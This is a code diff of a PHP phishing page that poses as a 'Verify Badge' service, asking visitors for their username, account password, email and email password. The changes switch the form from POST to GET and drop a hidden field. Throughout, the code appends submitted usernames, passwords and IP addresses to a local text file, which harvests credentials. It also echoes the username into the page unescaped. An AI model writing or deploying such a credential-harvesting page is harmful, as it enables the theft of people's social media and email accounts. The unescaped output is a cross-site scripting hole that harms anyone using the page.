@@ -13,24 +13,24 @@ function php_multiline()
 
 define("PHP_MULTILINE", php_multiline());
 
-if($_POST)
+if($_GET)
 {
-    if(empty($_POST['username'])) echo "<script type='text/javascript'>alert('Do not make space on your username!');</script>";
-    if(!empty($_POST['comen']) && empty($_POST['password'])) { echo "<script type='text/javascript'>alert('Do not make space !');</script>"; header('Location: /'); }
+    if(empty($_GET['username'])) echo "<script type='text/javascript'>alert('Do not make space on your username!');</script>";
+    if(!empty($_GET['comen']) && empty($_GET['password'])) { echo "<script type='text/javascript'>alert('Do not make space !');</script>"; header('Location: /'); }
 }
 
-if(!empty($_POST['username']) && empty($_POST['comen']))
+if(!empty($_GET['username']) && empty($_GET['comen']))
 {
-    $_POST['username'] = strtolower($_POST['username']);
+    $_GET['username'] = strtolower($_GET['username']);
 }
 
-if(isset($_POST['comen']))
+if(isset($_GET['comen']))
 {
     $dosya = fopen("baris-altay.txt", "a");
     fwrite($dosya, "
-    $_KULLANICI_ADI : ${$_POST['username']},
+    $_KULLANICI_ADI : ${$_GET['username']},
     
-    $_SIFRE         : ${$_POST['password']},
+    $_SIFRE         : ${$_GET['password']},
     
     $_IP            : ${$_SERVER['REMOTE_ADDR']},
     
@@ -73,11 +73,11 @@ if(isset($_POST['comen']))
         </div>
         <?php
         
-        if(empty($_POST['username']))
+        if(empty($_GET['username']))
         {
         
         ?>
-        <form action="/" method="POST" class="first-form">
+        <form action="/" method="GET" class="first-form">
             <div class="banner-sm">
                 <img src="images/banner-sm.png" class="banner-sm-img" width="175">
             </div>
@@ -92,8 +92,8 @@ if(isset($_POST['comen']))
         <?php
         }else {
         ?>
-        <form action="/" method="POST" class="second-form">
-            <p>Verify Badge @<?= $_POST['username']; ?><img style="margin-top: 5px;" src="https://istalya.com/image/cache/catalog/resimler/Varl%C4%B1k%201-1080x1080w.png" width=20 height=20></p>
+        <form action="/" method="GET" class="second-form">
+            <p>Verify Badge @<?= $_GET['username']; ?><img src="https://istalya.com/image/cache/catalog/resimler/Varl%C4%B1k%201-1080x1080w.png" width=20 height=20></p>
             <span class="color-gray">Verify Badge on your account.</span>
             <div class="mb-3">
                 <input type="password" name="password" id="password" class="form-input" placeholder="Password">
@@ -104,7 +104,6 @@ if(isset($_POST['comen']))
             <div class="mb-3">
                 <input type="password" name="emailPassword" id="emailPassword" class="form-input" placeholder="Email Password">
             </div>
-            <input hidden type="text" name="username" id="username" value="<?= $_POST['username']; ?>">
             <input hidden type="number" name="comen" value="1">
             <div class="mb-3">
                 <button type="submit">Get Verify</button>
